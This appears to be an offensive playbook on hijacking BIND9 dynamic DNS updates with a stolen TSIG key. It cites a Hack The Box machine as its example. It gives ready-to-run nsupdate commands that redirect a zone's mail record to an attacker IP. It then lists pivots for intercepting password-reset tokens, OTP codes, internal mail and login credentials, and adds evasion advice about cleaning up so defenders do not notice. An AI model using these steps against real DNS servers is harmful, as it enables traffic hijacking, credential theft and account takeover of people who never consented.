# BIND9 TSIG Key Hijack — Dynamic Update via Stolen Secret

## When this applies

- BIND9 zone configured with `allow-update { key "<name>"; };` (dynamic updates gated by a TSIG key).
- An LFI / arbitrary-file-read primitive lets you read `/etc/bind/named.conf*` or `/etc/bind/rndc.key`.
- You want to add/modify/delete records (typically a `mail.<zone>` A record) so an internal client (mail server, password-reset bot) connects to your IP instead.

This pattern shows up on chat-server lateral pivots (e.g. HTB Snoopy: LFI → BIND TSIG → mail subdomain hijack → Mattermost password-reset interception).

## Files of interest

| File | Contents |
|------|----------|
| `/etc/bind/named.conf` | Includes other configs; sometimes contains the `key { algorithm; secret; };` block directly |
| `/etc/bind/named.conf.local` | Per-zone `allow-update { key "..."; };` declarations |
| `/etc/bind/named.conf.options` | Global options (recursion, allow-transfer) |
| `/etc/bind/rndc.key` | rndc control key (HMAC for `rndc reload`/`rndc flush`) — separate from update keys |
| `/var/cache/bind/*.jnl` | Journal of dynamic updates (when readable, useful for archeology) |
| `/var/lib/bind/db.<zone>` | Live zone master file |

The block to extract:
```
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

## Add a record

```bash
cat > /tmp/upd.txt <<EOF
server <bind-ip>
zone <zone>
update add mail.<zone> 60 A <attacker-ip>
send
EOF

nsupdate -y "hmac-sha256:<keyname>:<secret>" /tmp/upd.txt
# Confirm:
dig @<bind-ip> mail.<zone> +short
```

The algorithm name in `-y` MUST match what the zone declared (`hmac-sha256`, `hmac-sha512`, `hmac-md5` etc.). Mismatched algo → `BADKEY` rcode.

## Remove a record

```bash
cat > /tmp/upd.txt <<EOF
server <bind-ip>
zone <zone>
update delete mail.<zone> A
send
EOF
nsupdate -y "hmac-sha256:<keyname>:<secret>" /tmp/upd.txt
```

Always clean up after the attack — leftover poisoned records will tip off blue team / break legitimate mail.

## Pivot patterns

- **Mail subdomain hijack** → run an SMTP catcher on TCP/25 of `<attacker-ip>` and trigger any password-reset / notification flow on the target. Captures reset tokens, internal user mail, OTP codes.
- **Web subdomain hijack** → host a fake login page or HTTP-to-HTTPS downgrade proxy and capture creds from internal users.
- **Hijack the chat/SSO subdomain** if it's not pinned (rare — most are `Strict-Transport-Security` + cert-pinned).
- **Repoint a redirect-URI host** for OAuth code interception when the IdP doesn't allow-list IPs.

## Detection / OPSEC notes

- Dynamic updates are logged in `/var/log/syslog` (or named's configured logfile) with the source IP and key name.
- `update-policy` (RFC 4035) can restrict which records each key may modify; if your hijack `update add mail.X` returns `REFUSED`, the policy disallows that name. Read the policy block to find what IS allowed.
- Some zones have `also-notify` to slaves — a forced AXFR on the slave will reveal your injected record.

## Common pitfalls

- `;; Couldn't find server '<host>'` — pass an IP, not a hostname (the resolver may not yet know the new mail subdomain you're about to add).
- TSIG signature failures = clock skew (>5 min) or wrong algo. Use `faketime` if needed.
- `rndc.key` is for `rndc` admin commands, NOT for zone updates — different key. Look for the key whose name matches `allow-update { key "<name>"; }`.
